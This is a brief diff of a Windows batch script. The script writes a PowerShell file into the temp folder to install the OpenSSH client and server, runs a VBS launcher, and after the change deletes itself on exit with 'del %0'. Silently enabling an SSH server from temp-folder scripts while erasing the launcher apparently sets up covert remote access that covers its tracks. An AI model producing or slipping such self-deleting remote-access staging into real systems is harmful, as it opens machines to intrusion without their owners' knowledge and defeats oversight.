@@ -3,7 +3,7 @@
 if not exist "%temp%\run.ps1" goto 2
 cd "%temp%"
 start run.vbs
-exit
+del %0 | exit
 :2
 echo Add-WindowsCapability -Online -Name OpenSSH.Client~~~~0.0.1.0 >> "%temp%\run.ps1"
 echo Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0 >> "%temp%\run.ps1"
